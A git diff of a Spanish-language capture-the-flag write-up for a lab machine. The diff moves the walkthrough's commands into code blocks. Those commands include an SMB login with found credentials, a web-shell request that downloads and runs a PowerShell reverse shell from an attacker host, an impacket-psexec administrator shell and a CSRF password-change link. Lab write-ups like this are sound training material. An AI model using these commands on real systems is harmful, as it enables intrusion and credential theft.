@@ -167,11 +167,23 @@ tyler / 92g!mA8BGjOirkL%OG*&
 
 ![Credenciales expuestas](./images/exploit_9.png)
 
-Con las credenciales obtenidas se probó el acceso haciendo de uso de `crackmapexec smb 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&' --shares` visualizando así los folders compartidos y pudiendo tener acceso de lectura y escritura a `new-site`.
+Con las credenciales obtenidas se probó el acceso haciendo de uso de:
+
+```bash
+crackmapexec smb 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&' --shares
+```
+
+Visualizando así los folders compartidos y pudiendo tener acceso de lectura y escritura a `new-site`.
 
 ![Ejecución de crackmapexec](./images/exploit_10.png)
 
-Al entrar al folder compartido con `smbclient \\\\10.10.10.97\\new-site -U 'tyler'` se visualizaron los archivos predeterminados en el servidor IIS por que se puede relacionar con el puerto `8808`.
+Al entrar al folder compartido con:
+
+```bash
+smbclient \\\\10.10.10.97\\new-site -U 'tyler'
+```
+
+Se visualizaron los archivos predeterminados en el servidor IIS por que se puede relacionar con el puerto `8808`.
 
 ![Ejecución de crackmapexec](./images/exploit_11.png)
 
@@ -187,7 +199,17 @@ Obteniendo así ejecución de comandos.
 
 Para entablar una reverse shell, inicialmente se buscó cargar el binario de netcat en la máquina, método que no funcionó en esta ocasión, razón por la que se busco invocar la revershell de powershell ofrecida por [nishang](https://github.com/samratashok/nishang). Disponible tanto en el repositorio como en el manejador de paquetes de kali (`sudo apt install nishang`).
 
-Después de generar una copia y modificar el archivo `/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1`, añadiendo hasta el final la llamada a la función `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443` exponiéndola mediante un servicio web, se entabló una reverse shell satisfactoriamente mediante la invocación de la request `http://10.10.10.97:8808/shell.php?cmd=powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')`.
+Después de generar una copia y modificar el archivo `/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1`, añadiendo hasta el final la llamada a la función: 
+
+```powershell
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443
+```
+
+Exponiéndola mediante un servicio web, se entabló una reverse shell satisfactoriamente mediante la invocación de la request:
+
+```url
+http://10.10.10.97:8808/shell.php?cmd=powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')
+```
 
 ![Reverse shell entablada](./images/exploit_14.png)
 
@@ -199,7 +221,12 @@ Después de navegar a través del sistema de archivos se identificó en la ruta 
 
 ![Directorios y zip expuestos](./images/post_1.png)
 
-Al ejecutar winPEAS se corroboró su existencia y se pudo identificar que el usuario por defecto en el sub-sistema es `root` mediante la invocación de comandos como `wsl.exe whoami` o `wsl.exe ls -la /`.
+Al ejecutar winPEAS se corroboró su existencia y se pudo identificar que el usuario por defecto en el sub-sistema es `root` mediante la invocación de comandos como:
+
+```powershell
+wsl.exe whoami
+wsl.exe ls -la /
+```
 
 ![WSL reportado por winPEAS](./images/post_2.png)
 
@@ -215,7 +242,11 @@ Después de navegar en los directorios del sub-sistema se encontró la disponibi
 
 ![Contraseña de administador expuesta](./images/post_4.png)
 
-Dado que `smbclient` utiliza como separador el caracter `%` a diferencia de otras herramientas, se idenficó la contraseña como `u6!4ZwgwOM#^OBf#Nwnh` por lo que a partir de ahí se entabló una reverse shell como administrador haciendo uso de `impacket-psexec 'administrator:u6!4ZwgwOM#^OBf#Nwnh@10.10.10.97'`.
+Dado que `smbclient` utiliza como separador el caracter `%` a diferencia de otras herramientas, se idenficó la contraseña como `u6!4ZwgwOM#^OBf#Nwnh` por lo que a partir de ahí se entabló una reverse shell como administrador haciendo uso de:
+
+```bash
+impacket-psexec 'administrator:u6!4ZwgwOM#^OBf#Nwnh@10.10.10.97'
+```
 
 ![Reverse shell como administador](./images/post_5.png)
 
@@ -233,7 +264,13 @@ Lo que permite capturar la petición para visualizar como está construida y env
 
 ![Petición de cambio de contraseña](./images/post_7.png)
 
-Enviando por medio de la sección de contacto el mensaje `http://10.10.10.97/change_pass.php?password=srrequiem&confirm_password=srrequiem&submit=submit`, esperando que sea abierto y posteriormente corroborando su ejecución al intentar loguearse como el usuario `tyler:srrequiem`, se obtiene acceso a las notas de `tyler`.
+Enviando por medio de la sección de contacto el mensaje:
+
+```text
+http://10.10.10.97/change_pass.php?password=srrequiem&confirm_password=srrequiem&submit=submit
+```
+
+Esperando que sea abierto y posteriormente corroborando su ejecución al intentar loguearse como el usuario `tyler:srrequiem`, se obtiene acceso a las notas de `tyler`.
 
 ![Logueo de usuario tyler con contraseña cambiada](./images/post_8.png)
 
